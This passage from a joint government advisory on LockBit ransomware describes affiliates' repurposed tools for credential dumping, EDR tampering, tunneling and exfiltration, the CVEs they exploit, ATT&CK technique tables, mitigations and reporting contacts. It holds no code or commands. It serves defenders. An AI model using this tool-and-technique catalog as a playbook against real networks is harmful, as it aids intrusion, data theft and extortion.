From the incidents handled, ANSSI can infer that LockBit 3.0 widely took over from LockBit 2.0 and the original LockBit strain from 2022. In two cases, victims were infected with as many as three different strains of LockBit (LockBit 2.0/Red, LockBit 3.0/Black, and LockBit Green).
Leak Sites
The authoring agencies observe data leak sites, where attackers publish the names and captured data of victims if they do not pay ransom or hush money. Additionally, these sites can be used to record alleged victims who have been threatened with a data leak. The term 'victims' may include those who have been attacked, or those who have been threatened or blackmailed (with the attack having taken place).
The leak sites only show the portion of LockBit affiliates’ victims subjected to secondary extortion. Since 2021, LockBit affiliates have employed double extortion by first encrypting victim data and then exfiltrating that data while threatening to post that stolen data on leak sites. Because LockBit only reveals the names and leaked data of victims who refuse to pay the primary ransom to decrypt their data, some LockBit victims may never be named or have their exfiltrated data posted on leak sites. As a result, the leak sites reveal a portion of LockBit affiliates’ total victims. For these reasons, the leak sites are not a reliable indicator of when LockBit ransomware attacks occurred. The date of data publication on the leak sites may be months after LockBit affiliates actually executed ransomware attacks.
Up to the Q1 2023, a total of 1,653 alleged victims were observed on LockBit leak sites. With the introduction of LockBit 2.0 and LockBit 3.0, the leak sites have changed, with some sources choosing to differentiate leak sites by LockBit versions and others ignoring any differentiation. Over time, and through different evolutions of LockBit, the address and layout of LockBit leak sites have changed and are aggregated under the common denominator of the LockBit name. The introduction of LockBit 2.0 at the end of the Q2 2021 had an immediate impact on the cybercriminal market due to multiple RaaS operations shutting down in May and June 2021 (e.g., DarkSide and Avaddon). LockBit competed with other RaaS operations, like Hive RaaS, to fill the gap in the cybercriminal market leading to an influx of LockBit affiliates. Figure 2 shows the alleged number of victims worldwide on LockBit leak sites starting in Q3 2020. Figure 2 shows the alleged number of victims worldwide on LockBit leak sites starting in Q3 2020.

 


Figure 2: Alleged Number of Victims Worldwide on LockBit Leak Sites
Tools
During their intrusions, LockBit affiliates have been observed using various freeware and open-source tools that are intended for legal use. When repurposed by LockBit, these tools are then used for a range of malicious cyber activity, such as network reconnaissance, remote access and tunneling, credential dumping, and file exfiltration. Use of PowerShell and batch scripts are observed across most intrusions, which focus on system discovery, reconnaissance, password/credential hunting, and privilege escalation. Artifacts of professional penetration-testing tools such as Metasploit and Cobalt Strike have also been observed.
Table 4 shows a list of legitimate freeware and open-source tools LockBit affiliates have repurposed for ransomware operations. The legitimate freeware and open-source tools mentioned in this product are all publicly available and legal. The use of these tools by a threat actor should not be attributed to the freeware and open-source tools, absent specific articulable facts tending to show they are used at the direction or under the control of a threat actor.
Table 4: Freeware and Open-Source Tools Used by LockBit Affiliates



Tool
Intended Use
Repurposed Use by LockBit Affiliates
MITRE ATT&CK ID


7-zip
Compresses files into an archive.
Compresses data to avoid detection before exfiltration.

T1562
Impair Defenses



AdFind
Searches Active Directory (AD) and gathers information.
Gathers AD information used to exploit a victim’s network, escalate privileges, and facilitate lateral movement.

S0552
AdFind



Advanced Internet Protocol (IP) Scanner
Performs network scans and shows network devices.
Maps a victim’s network to identify potential access vectors.

T1046
Network Service Discovery



Advanced Port Scanner
Performs network scans.
Finds open Transmission Control Protocol (TCP) and User Data Protocol (UDP) ports for exploitation.

T1046
Network Service Discovery



AdvancedRun
Allows software to be run with different settings.
Enables escalation of privileges by changing settings before running software.

TA0004
Privilege Escalation



AnyDesk
Enables remote connections to network devices.
Enables remote control of victim’s network devices.

T1219
Remote Access Software



Atera Remote Monitoring & Management (RMM)
Enables remote connections to network devices.
Enables remote control of victim’s network devices.

T1219
Remote Access Software



Backstab
Terminates antimalware-protected processes.
Terminates endpoint detection and response (EDR)- protected processes.

T1562.001
Impair Defenses: Disable or Modify Tools



Bat Armor
Generates .bat files using PowerShell scripts.
Bypasses PowerShell execution policy.

T1562.001
Impair Defenses: Disable or Modify Tools



Bloodhound
Performs reconnaissance of AD for attack path management.
Enables identification of AD relationships that can be exploited to gain access onto a victim’s network.

T1482
Domain Trust Discovery



Chocolatey
Handles command-line package management on Microsoft Windows.
Facilitates installation of LockBit affiliate actors’ tools.

T1072
Software Deployment Tools



Defender Control
Disables Microsoft Defender.
Enables LockBit affiliate actors to bypass Microsoft Defender.

T1562.001
Impair Defenses: Disable or Modify Tools



ExtPassword
Recovers passwords from Windows systems.
Obtains credentials for network access and exploitation.

T1003
Operating System (OS) Credential Dumping



FileZilla
Performs cross-platform File Transfer Protocol (FTP) to a site, server, or host.
Enables data exfiltration over FTP to the LockBit affiliate actors’ site, server, or host.

T1071.002
Application Layer Protocol: File Transfer Protocols



FreeFileSync
Facilitates cloud-based file synchronization.
Facilitates cloud-based file synchronization for data exfiltration.

T1567.002
Exfiltration Over Web Service: Exfiltration to Cloud Storage



GMER
Removes rootkits.
Terminates and removes EDR software.

T1562.001
Impair Defenses: Disable or Modify Tools



Impacket
Collection of Python classes for working with network protocols.
Enables lateral movement on a victim’s network.

S0357
Impacket



LaZagne
Recovers system passwords across multiple platforms.
Collect credentials for accessing a victim’s systems and network.

S0349
LaZagne



Ligolo
Establishes SOCKS5 or TCP tunnels from a reverse connection for pen testing.
Enables connections to systems within the victim’s network via reverse tunneling.

T1095
Non-Application Layer Protocol



LostMyPassword
Recovers passwords from Windows systems.
Obtains credentials for network access and exploitation.

T1003
OS Credential Dumping



MEGA Ltd MegaSync
Facilitates cloud-based file synchronization.
Facilitates cloud-based file synchronization for data exfiltration.

T1567.002
Exfiltration Over Web Service: Exfiltration to Cloud Storage



Microsoft Sysinternals ProcDump
Monitors applications for central processing unit (CPU) spikes and generates crash dumps during a spike.
Obtains credentials by dumping the contents of Local Security Authority Subsystem Service (LSASS).

T1003.001
OS Credential Dumping: LSASS Memory



Microsoft Sysinternals PsExec
Executes a command-line process on a remote machine.
Enables LockBit affiliate actors to control victim’s systems.

S0029
PsExec



Mimikatz
Extracts credentials from a system.
Extracts credentials from a system for gaining network access and exploiting systems.

S0002
Mimikatz



Ngrok
Enables remote access to a local web server by tunnelling over the internet.
Enables victim network protections to be bypassed by tunnelling to a system over the internet.

S0508
Ngrok



PasswordFox
Recovers passwords from Firefox Browser.
Obtains credentials for network access and exploitation.

T1555.003
Credentials from Web Browsers



PCHunter
Enables advanced task management including system processes and kernels.
Terminates and circumvents EDR processes and services.

T1562.001
Impair Defenses: Disable or Modify Tools



PowerTool
Removes rootkits, as well as detecting, analyzing, and fixing kernel structure modifications.
Terminates and removes EDR software.

T1562.001
Impair Defenses: Disable or Modify Tools



Process Hacker
Removes rootkits.
Terminates and removes EDR software.

T1562.001
Impair Defenses: Disable or Modify Tools



PuTTY Link (Plink)
Automates Secure Shell (SSH) actions on Windows.
Enables LockBit affiliate actors to avoid detection.

T1572
Protocol Tunneling



Rclone
Manages cloud storage files using a command-line program.
Facilitates data exfiltration over cloud storage.

S1040
Rclone



Seatbelt

Performs numerous security-oriented checks.
 

Performs numerous security-oriented checks to enumerate system information.

T1082
System Information Discovery



ScreenConnect (also known as ConnectWise)
Enables remote connections to network devices for management.
Enables LockBit affiliate actors to remotely connect to a victim’s systems.

T1219
Remote Access Software



SoftPerfect Network Scanner
Performs network scans for systems management.
Enables LockBit affiliate actors to obtain information about a victim’s systems and network.

T1046
Network Service Discovery



Splashtop
Enables remote connections to network devices for management.
Enables LockBit affiliate actors to remotely connect to systems over Remote Desktop Protocol (RDP).

T1021.001
Remote Services: Remote Desktop Protocol



TDSSKiller
Removes rootkits.
Terminates and removes EDR software.

T1562.001
Impair Defenses: Disable or Modify Tools



TeamViewer
Enables remote connections to network devices for management.
Enables LockBit affiliate actors to remotely connect to a victim’s systems.

T1219
Remote Access Software



ThunderShell
Facilitates remote access via Hypertext Transfer Protocol (HTTP) requests.
Enables LockBit affiliate actors to remotely access systems while encrypting network traffic.

T1071.001
Application Layer Protocol: Web Protocols



WinSCP
Facilitates file transfer using SSH File Transfer Protocol for Microsoft Windows.
Enables data exfiltration via the SSH File Transfer Protocol.

T1048
Exfiltration Over Alternative Protocol




Common Vulnerabilities and Exposures (CVEs) Exploited
Based on secondary sources, it was noted that affiliates exploit older vulnerabilities like CVE-2021-22986, F5 iControl REST unauthenticated Remote Code Execution Vulnerability, as well as newer vulnerabilities such as:

CVE-2023-0669: Fortra GoAnyhwere Managed File Transfer (MFT) Remote Code Execution Vulnerability
CVE-2023-27350: PaperCut MF/NG Improper Access Control Vulnerability

LockBit affiliates have been documented exploiting numerous CVEs, including:

CVE-2021-44228: Apache Log4j2 Remote Code Execution Vulnerability,
CVE-2021-22986: F5 BIG-IP and BIG-IQ Centralized Management iControl REST Remote Code Execution Vulnerability,
CVE-2020-1472: NetLogon Privilege Escalation Vulnerability,
CVE-2019-0708: Microsoft Remote Desktop Services Remote Code Execution Vulnerability, and
CVE-2018-13379: Fortinet FortiOS Secure Sockets Layer (SSL) Virtual Private Network (VPN) Path Traversal Vulnerability.

For further information on these CVEs, see CISA’s Known Exploited Vulnerabilities (KEV) Catalog.
Post Detonation TTPs
When LockBit affiliates target an organization responsible for managing other organizations’ networks, CERT NZ has observed LockBit affiliates attempt secondary ransomware extortion after detonation of the LockBit variant on the primary target. Once the primary target is hit, LockBit affiliates then attempt to extort the companies that are customers of the primary target. This extortion is in the form of secondary ransomware that locks down services those customers consume. Additionally, the primary target’s customers may be extorted by LockBit affiliates threatening to release those customers’ sensitive information.
MITRE ATT&CK Tactics and Techniques
Tables 5-16 show the LockBit affiliate tactics and techniques referenced in this advisory.
Table 5: LockBit Affiliates’ ATT&CK Techniques for Enterprise – Initial Access



Technique Title
ID
Use


Drive-by Compromise
T1189
LockBit affiliates gain access to a system through a user visiting a website over the normal course of browsing.


Exploit Public-Facing Application
T1190
LockBit affiliates may exploit vulnerabilities (e.g., Log4Shell) in internet-facing systems to gain access to victims’ systems.


External Remote Services
T1133
LockBit affiliates exploit RDP to gain access to victims’ networks.


Phishing
T1566
LockBit affiliates use phishing and spearphishing to gain access to victims' networks.


Valid Accounts
T1078
LockBit affiliates obtain and abuse credentials of existing accounts as a means of gaining initial access.



Table 6: LockBit Affiliates’ ATT&CK Techniques for Enterprise – Execution



Technique Title
ID
Use


Execution
TA0002
LockBit 3.0 launches commands during its execution.


Command and Scripting Interpreter: Windows Command Shell
T1059.003
LockBit affiliates use batch scripts to execute malicious commands.


Software Deployment Tools
T1072
LockBit affiliates may use Chocolatey, a command-line package manager for Windows.



 
 



Technique Title
ID
Use


System Services: Service Execution
T1569.002
LockBit 3.0 uses PsExec to execute commands or payloads.



Table 7: LockBit Affiliates’ ATT&CK Techniques for Enterprise – Persistence



Technique Title
ID
Use


Boot or Logon Autostart Execution
T1547
LockBit affiliates enables automatic logon for persistence.


Valid Accounts
T1078
LockBit affiliates may use a compromised user account to maintain persistence on the target network.



Table 8: LockBit Affiliates’ ATT&CK Techniques for Enterprise – Privilege Escalation



Technique Title
ID
Use


Privilege Escalation
TA0004
LockBit affiliates will attempt to escalate to the required privileges if current account privileges are insufficient.


Abuse Elevation Control Mechanism
T1548
LockBit affiliates may use ucmDccwCOM Method in UACMe, a GitHub collection of User Account Control (UAC) bypass techniques.


Boot or Logon Autostart Execution
T1547
LockBit affiliates enable automatic logon for privilege escalation.


Domain Policy Modification: Group Policy Modification
T1484.001
LockBit affiliates may create Group Policy for lateral movement and can force group policy updates. 


Valid Accounts
T1078
LockBit affiliates may use a compromised user account to escalate privileges on a victim’s network.



Table 9: LockBit Affiliates’ ATT&CK Techniques for Enterprise – Defense Evasion



Technique Title
ID
Use


Execution Guardrails: Environmental Keying
T1480.001
LockBit 3.0 will only decrypt the main component or continue to decrypt and/or decompress data if the correct password is entered.


Impair Defenses: Disable or Modify Tools
T1562.001

LockBit 3.0 affiliates use Backstab, Defender Control, GMER, PCHunter, PowerTool, Process Hacker or TDSSKiller to disable EDR processes and services.
 
LockBit 3.0 affiliates use Bat Armor to bypass the PowerShell execution Policy.
 
LockBit affiliates may deploy a batch script, 123.bat, to disable and uninstall antivirus software.
 
Lockbit 3.0 may modify and/or disable security tools including EDR and antivirus to avoid possible detection of malware, tools, and activities.



Indicator Removal: Clear Windows Event Logs

T1070.001
 

LockBit executable clears the Windows Event Logs files.


Indicator Removal: File Deletion
T1070.004
LockBit 3.0 will delete itself from the disk.


Obfuscated Files or Information
T1027
LockBit 3.0 will send encrypted host and bot information to its command and control (C2) servers.


Obfuscated Files or Information: Software Packing
T1027.002
LockBit affiliates may perform software packing or virtual machine software protection to conceal their code. Blister Loader has been used for such purpose.



Table 10: LockBit Affiliates’ ATT&CK Techniques for Enterprise – Credential Access



Technique Title
ID
Use


Brute Force
T1110
LockBit affiliates may leverage VPN or RDP brute force credentials as an initial access.


Credentials from Password Stores: Credentials from Web Browsers
T1555.003
LockBit 3.0 actors use PasswordFox to recover passwords from Firefox Browser.


OS Credential Dumping
T1003
LockBit 3.0 actors use ExtPassword or LostMyPassword to recover passwords from Windows systems.


OS Credential Dumping: LSASS Memory
T1003.001

LockBit affiliates may use Microsoft Sysinternals ProDump to dump the contents of lsass.exe.
LockBit affiliates have used Mimikatz to dump credentials.




Table 11: LockBit Affiliates’ ATT&CK Techniques for Enterprise – Discovery



Technique Title
ID
Use


Network Service Discovery
T1046

LockBit affiliates use SoftPerfect Network Scanner, Advanced IP Scanner, or Advanced Port Scanner to scan target networks.
LockBit affiliates may use SoftPerfect Network Scanner, Advanced Port Scanner, and AdFind to enumerate connected machines in the network.



System Information Discovery
T1082
LockBit affiliates will enumerate system information to include hostname, host configuration, domain information, local drive configuration, remote shares, and mounted external storage devices.


System Location Discovery: System Language Discovery
T1614.001
LockBit 3.0 will not infect machines with language settings that match a defined exclusion list.



Table 12: LockBit Affiliates’ ATT&CK Techniques for Enterprise – Lateral Movement



Technique Title
ID
Use


Lateral Movement
TA0008
LockBit affiliates will laterally move across networks and access domain controllers.


Remote Services: Remote Desktop Protocol
T1021.001
LockBit affiliates use Splashtop remote-desktop software to facilitate lateral movement.


Remote Services: Server Message Block (SMB)/Admin Windows Shares
T1021.002
LockBit affiliates may use Cobalt Strike and target SMB shares for lateral movement.



Table 13: LockBit Affiliates’ ATT&CK Techniques for Enterprise – Collection



Technique Title
ID
Use


Archive Collected Data: Archive via Utility
T1560.001
LockBit affiliates may use 7-zip to compress and/or encrypt collected data prior to exfiltration.



Table 14: LockBit Affiliates’ ATT&CK Techniques for Enterprise – Command and Control



Technique Title
ID
Use


Application Layer Protocol: File Transfer Protocols
T1071.002
LockBit affiliates may use FileZilla for C2.


Application Layer Protocol: Web Protocols
T1071.001
LockBit affiliates use ThunderShell as a remote access tool that communicates via HTTP requests.


Non-Application Layer Protocol
T1095
LockBit affiliates use Ligolo to establish SOCKS5 or TCP tunnels from a reverse connection.


Protocol Tunneling
T1572
LockBit affiliates use Plink to automate SSH actions on Windows.


Remote Access Software
T1219
LockBit 3.0 actors use AnyDesk, Atera RMM, ScreenConnect or TeamViewer for C2.



Table 15: LockBit Affiliates’ ATT&CK Techniques for Enterprise – Exfiltration



Technique Title
ID
Use


Exfiltration
TA0010
LockBit affiliates use StealBit, a custom exfiltration tool first used with LockBit 2.0, to steal data from a target network.


Exfiltration Over Web Service
T1567
LockBit affiliates use publicly available file sharing services to exfiltrate a target’s data. 


Exfiltration Over Web Service: Exfiltration to Cloud Storage
T1567.002
LockBit affiliates use (1) Rclone, an open-source command line cloud storage manager or FreeFileSync to exfiltrate and (2) MEGA, a publicly available file sharing service for data exfiltration.



Table 16: LockBit Affiliates’ ATT&CK Techniques for Enterprise – Impact



Technique Title
ID
Use


Data Destruction
T1485
LockBit 3.0 deletes log files and empties the recycle bin.


Data Encrypted for Impact
T1486

LockBit 3.0 encrypts data on target systems to interrupt availability to system and network resources.
LockBit affiliates can encrypt Windows and Linux devices, as well as VMware instances. 



Defacement: Internal Defacement
T1491.001
LockBit 3.0 changes the host system’s wallpaper and icons to the LockBit 3.0 wallpaper and icons, respectively.


Inhibit System Recovery
T1490
LockBit 3.0 deletes volume shadow copies residing on disk.


Service Stop
T1489
LockBit 3.0 terminates processes and services.



Mitigations
The authoring organizations recommend implementing the mitigations listed below to improve their cybersecurity posture to better defend against LockBit’s activity. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.
The listed mitigations are ordered by MITRE ATT&CK tactic. Mitigations that apply to multiple MITRE ATT&CK tactics are listed under the tactic that occurs earliest in an incident’s lifecycle. For example, account use polices are mitigations for initial access, persistence, privilege escalation, and credential access but would be listed under initial access mitigations.
Initial Access

Consider implementing sandboxed browsers to protect systems from malware originating from web browsing. Sandboxed browsers isolate the host machine from malicious code.
Require all accounts with password logins (e.g., service account, admin accounts, and domain admin accounts) to comply with NIST standards for developing and managing password policies [CPG 2.L].

Enforce use of longer passwords consisting of at least 15 characters in length [CPG 2.B, 2.C].
Store passwords in a salted and hashed format using industry-recognized password hashing algorithms.
Prevent use of commonly used or known-compromised passwords [CPG 2.C].
Implement multiple failed login attempt account lockouts [CPG 2.G].
Disable password “hints.”
Refrain from requiring password changes more frequently than once per year.Note: NIST guidance suggests favoring longer passwords instead of requiring regular and frequent password resets. Frequent password resets are more likely to result in users developing password “patterns” cyber criminals can easily decipher.
Require administrator credentials to install software [CPG 2.Q].


Implement filters at the email gateway to filter out emails with known malicious indicators, such as known malicious subject lines, and block suspicious IP addresses at the firewall [CPG 2.M].
Install a web application firewall and configure with appropriate rules to protect enterprise assets.
Segment networks to prevent the spread of ransomware. Network segmentation can help prevent the spread of ransomware by controlling traffic flows between—and access to—various subnetworks and by restricting adversary lateral movement. Isolate web-facing applications to further minimize the spread of ransomware across a network [CPG 2.F].
Follow the least-privilege best practice by requiring administrators to use administrative accounts for managing systems and use simple user accounts for non-administrative tasks [CPG 2.E].
Enforce the management of and audit user accounts with administrative privileges. Configure access controls according to the principle of least privilege [CPG 2.E]. 
Implement time-based access for accounts set at the admin level and higher. For example, the Just-in-Time (JIT) access method provisions privileged access when needed and can support enforcement of the principle of least privilege (as well as the Zero Trust model). This is a process where a network-wide policy is set in place to automatically disable admin accounts at the Active Directory level when the account is not in direct need. Individual users may submit their requests through an automated process that grants them access to a specified system for a set timeframe when they need to support the completion of a certain task.
Keep all operating systems, software, and firmware up to date. Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats. Public-facing applications must be patched in a timely manner as vulnerabilities can often be exploited directly by the threat actor. By closely monitoring the threat landscape, threat actors often take advantage of vulnerabilities before systems are patched. Organizations should patch vulnerable software and hardware systems within 24 to 48 hours from when a vulnerability is disclosed. Prioritize patching known exploited vulnerabilities in internet-facing systems [CPG 1.E].
Restrict service accounts from remotely accessing other systems. Configure group policy to Deny log on locally, Deny log on through Terminal Services, and Deny access to this computer from the network for all service accounts to limit the ability for compromised service accounts to be used for lateral movement.
Block direct internet access for administration interfaces (e.g., application protocol interface (API)) and for remote access.
Require phishing-resistant multifactor authentication (MFA) for all services to the extent possible, particularly for webmail, virtual private networks, and privileged accounts that access critical systems [CPG 2.H].
Consolidate, monitor, and defend internet gateways.
Install, regularly update, and enable real-time detection for antivirus software on all hosts.
Raise awareness for phishing threats in your organization. Phishing is one of the primary infection vectors in ransomware campaigns, and all employees should receive practical training on the risks associated with the regular use of  email. With the rise of sophisticated phishing methods, such as using stolen email communication or artificial intelligence (AI) systems such as ChatGPT, the distinction between legitimate and malicious emails becomes more complex. This particularly applies to employees from corporate divisions that have to deal with a high volume of external email communication (e.g., staff recruitment) [CPG 2.I, 2.J].
Consider adding an external email warning banner for emails sent to or received from outside of your organization [CPG 2.M].
Review internet-facing services and disable any services that are no longer a business requirement to be exposed or restrict access to only those users with an explicit requirement to access services, such as SSL, VPN, or RDP. If internet-facing services must be used, control access by only allowing access from an admin IP range [CPG 2.X].
 Review domain controllers, servers, workstations, and active directories for new and/or unrecognized accounts.
Regularly verify the security level of the Active Directory domain by checking for misconfigurations.

Execution

Develop and regularly update comprehensive network diagram(s) that describes systems and data flows within your organization’s network(s) [CPG 2.P].
Control and restrict network connections accordingly with a network flow matrix.
Enable enhanced PowerShell logging [CPG 2.T, 2.U].

PowerShell logs contain valuable data, including historical OS, registry interaction, and possibility of a threat actor’s PowerShell use.
Ensure PowerShell instances are configured to use the latest version, and have module, script block, and transcription logging enabled (enhanced logging).
The two logs that record PowerShell activity are the PowerShell Windows Event Log and the PowerShell Operational Log. It is recommended to turn on these two Windows Event Logs with a retention period of at least 180 days. These logs should be checked on a regular basis to confirm whether the log data has been deleted or logging has been turned off. Set the storage size permitted for both logs to as large as reasonably practical.


Configure the Windows Registry to require UAC approval for any PsExec operations requiring administrator privileges to reduce the risk of lateral movement by PsExec.

Privilege Escalation

Disable command-line and scripting activities and permissions. Privilege escalation and lateral movement often depend on software utilities running from the command line. If threat actors are not able to run these tools, they will have difficulty escalating privileges and/or moving laterally [CPG 2.N].
Enable Credential Guard to protect your Windows system credentials. This is enabled by default on Windows 11 Enterprise 22H2 and Windows 11 Education 22H2. Credential Guard prevents credential dumping techniques of the Local Security Authority (LSA) secrets. Be aware that enabling this security control has some downsides. In particular, you can no longer use New Technology Local Area Network (LAN) Manager (NTLM) classic authentication single sign-on, Kerberos unconstrained delegation, as well as Data Encryption Standard (DES) encryption.
Implement Local Administrator Password Solution (LAPS) where possible if your OS is older than Windows Server 2019 and Windows 10 as these versions do not have LAPS built in. NOTE: The authoring organizations recommend organizations upgrade to Windows Server 2019 and Windows 10 or greater.

Defense Evasion

Apply local security policies to control application execution (e.g., Software Restriction Policies (SRP), AppLocker, Windows Defender Application Control (WDAC)) with a strict allowlist.
Establish an application allowlist of approved software applications and binaries that are allowed to be executed on a system. This measure prevents unwanted software to be run. Usually, application allowlist software can also be used to define blocklists so that the execution of certain programs can be blocked, for example cmd.exe or PowerShell.exe [CPG 2.Q].

Credential Access

Restrict NTLM uses with security policies and firewalling.

Discovery

Disable unused ports. Disable ports that are not being used for business purposes (e.g., RDP-TCP Port 3389). Close unused RDP ports.

Lateral Movement

Identify Active Directory control paths and eliminate the most critical among them according to the business needs and assets.
Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a networking monitoring tool. To aid in detecting the ransomware, implement a tool that logs and reports all network traffic, including lateral movement activity on a network [CPG 1.E]. EDR tools are particularly useful for detecting lateral connections as they have insight into common and uncommon network connections for each host.

Command and Control

Implement a tiering model by creating trust zones dedicated to an organization’s most sensitive assets.
VPN access should not be considered as a trusted network zone. Organizations should instead consider moving to zero trust architectures.

Exfiltration

Block connections to known malicious systems by using a Transport Layer Security (TLS) Proxy. Malware often uses TLS to communicate with the infrastructure of the threat actor. By using feeds for known malicious systems, the establishment of a connection to a C2 server can be prevented.
Use web filtering or a Cloud Access Security Broker (CASB) to restrict or monitor access to public-file sharing services that may be used to exfiltrate data from a network.

Impact

Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, and secure location (e.g., hard drive, storage device, the cloud) [CPG 2.R].
Maintain offline backups of data, and regularly maintain backup and restoration (daily or weekly at the minimum). By instituting this practice, the organization ensures they will not be severely interrupted, and/or only have irretrievable data [CPG 2.R]. ACSC recommends organizations follow the 3-2-1 backup strategy in which organizations have three copies of data (one copy of production data and two backup copies) on two different media, such as disk and tape, with one copy kept off-site for disaster recovery.
Ensure all backup data is encrypted, immutable (i.e., cannot be altered or deleted), and covers the entire organization’s data infrastructure [CPG 2.K, 2.R].

Implement Mitigations for Defense-in-Depth
Implementing multiple mitigations within a defense-in-depth approach can help protect against ransomware, such as LockBit. CERT NZ explains How ransomware happens and how to stop it by applying mitigations, or critical controls, to provide a stronger defense to detect, prevent, and respond to ransomware before an organization’s data is encrypted. By understanding the most common attack vectors, organizations can identify gaps in network defenses and implement the mitigations noted in this advisory to harden organizations against ransomware attacks. In Figure 3, a ransomware attack is broken into three phases:

Initial Access where the cyber actor is looking for a way into a network.
Consolidation and Preparation when the actor is attempting to gain access to all devices.
Impact on Target where the actor is able to steal and encrypt data and then demand ransom.

Figure 3 shows the mitigations/critical controls, as various colored hexagons, working together to stop a ransomware attacker from accessing a network to steal and encrypt data. In the Initial Access phase, mitigations working together to deny an attacker network access include securing internet-exposed services, patching devices, implementing MFA, disabling macros, employing application allowlisting, and using logging and alerting. In the Consolidation and Preparation phase, mitigations working together to keep an attacker from accessing network devices are patching devices, using network segmentation, enforcing the principle of least privilege, implementing MFA, and using logging and alerting. Finally, in the Impact on Target phase, mitigations working together to deny or degrade an attacker’s ability to steal and/or encrypt data includes using logging and alerting, using and maintaining backups, and employing application allowlisting.

 


 Critical Controls Key

 


Figure 3: Stopping Ransomware Using Layered Mitigations
Validate Security Controls
In addition to applying mitigations, the authoring organizations recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. The authoring organizations recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Tables 5-16).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

The authoring organizations recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
Resources

ACSC:

See 2023-03: ACSC Ransomware Profile – LockBit 3.0 for additional information.


CISA:

Stopransomware.gov is a whole-of-government approach that gives one central location for ransomware resources and alerts.
Information on no-cost cyber hygiene services is available at Cyber Hygiene Services and Ransomware Readiness Assessment.


CISA, NSA, FBI, and MS-ISAC:

See the #StopRansomware Guide developed through the Joint Ransomware Task Force (JRTF) to provide a one-stop resource to help organizations reduce the risk of ransomware incidents through best practices to detect, prevent, respond, and recover, including step-by-step approaches to address potential attacks.


FBI and CISA:

See Alert AA23-075A - #StopRansomware: LockBit 3.0 for information on IOCs and TTPs identified through FBI investigations as recently as March 2023.


MS-ISAC:

See the Center for Internet Security (CIS) Critical Security Controls (CIS Controls) https://www.cisecurity.org/insights/white-papers/cis-community-defense-model-2-0for information on strengthening an organization’s cybersecurity posture through implementing a prescriptive, prioritized, and simplified set of best.
See the CIS Community Defense Model 2.0 (CDM 2.0) for the effectiveness of the CIS Controls against the most prevalent types of attacks and how CDM 2.0 can be used to design, prioritize, implement, and improve an organization’s cybersecurity program.
See Blueprint for Ransomware Defense for a clear, actionable framework for ransomware mitigation, response, and recovery built around the CIS Controls.


NCSC-UK

See guidance on Mitigating malware and ransomware attacks for information on defending organizations against malware or ransomware attacks.


BSI:

See BSI’s Ransomware – Facts and Defense Strategies for a comprehensive collection of resources on ransomware prevention, detection, and reaction. Note: These resources are in German.


CCCS:

See CCCS’s Ransomware playbook (ITSM.00.099) for information on ransomware prevention and response.
See CCCS’s Top 10 IT security actions based on analysis of cyber threat trends to help minimize intrusions or the impacts of a successful cyber intrusion.


CERT NZ:

See CERT NZ’s Security awareness building and Creating an effective security awareness program to assist organization’s in providing adequate security awareness and training to personnel while creating a positive security culture.
Businesses can find information on developing an incident response plan, creating a contact list, and communicating ransomware incidents at CERT NZ’s Creating an incident response plan.


NCSC NZ:

For guidance on ransomware for public service agencies, see NCSC NZ’s Ransomware: Your organization should be both protected and prepared.



Reporting
The authoring organizations do not encourage paying ransom, as payment does not guarantee victim files will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, the authoring organizations urge you to promptly report ransomware incidents to your country’s respective authorities.

Australia: Australian organizations that have been impacted or require assistance in regard to a ransomware incident can contact ACSC via 1300 CYBER1 (1300 292 371), or by submitting a report to cyber.gov.au.
Canada: Canadian victims of ransomware are encouraged to consider reporting cyber incidents to law enforcement (e.g., local police or the Canadian Anti-Fraud Centre) as well as to the Canadian Centre for Cyber Security online via My Cyber Portal.
France:

Individuals and small organizations can seek assistance with Cybermalveillance – https://www.cybermalveillance.gouv.fr/.
Larger organizations, as well as public and regulated entities, can request assistance from CERT-FR via cert-fr@ssi.gouv.fr.


Germany: German victims of ransomware are encouraged to consider reporting cyber incidents to law enforcement (e.g., local police or the Central Contact Point for Cybercrime as well as to the Federal Office for Information Security (BSI) via the Reporting and Information Portal.
New Zealand: New Zealand organizations and businesses can report security incidents to the NCSC at incidents@ncsc.govt.nz or call 04 498 7654, or to CERT NZ through https://www.cert.govt/nz/it-specialists/report-an-incident/ or to ir@ops.cert.govt.nz.
United States:

Report ransomware incidents to a local FBI Field Office or CISA’s 24/7 Operations Center at Report@cisa.dhs.gov, cisa.gov/report, or 1-844-Say-CISA (1-844-729-2472). When available, please include the information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact.
For SLTTs, email soc@msisac.org or call (866) 787-4722.


United Kingdom: UK organizations should report any suspected compromises to NCSC.

Disclaimer
The information in this report is being provided “as is” for informational purposes only. The authoring organizations do not endorse any commercial product or service, including any subjects of analysis. Any reference to specific commercial products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by the authoring organizations.
References
[1] LockBit, BlackCat, and Royal Dominate the Ransomware Scene
[2] Ransomware Diaries: Volume 1
[3] What is LockBit ransomware and how does it operate?
[4] Ransomware Spotlight: LockBit
[5] Analysis and Impact of LockBit Ransomware’s First Linux and VMware ESXi Variant
[6] A first look at the builder for LockBit 3.0 Black
[7] LockBit ransomware gang releases LockBit Green version
[8] LockBit Ransomware Now Targeting Apple macOS Devices
[9] Apple’s Macs Have Long Escaped Ransomware. That May be Changing
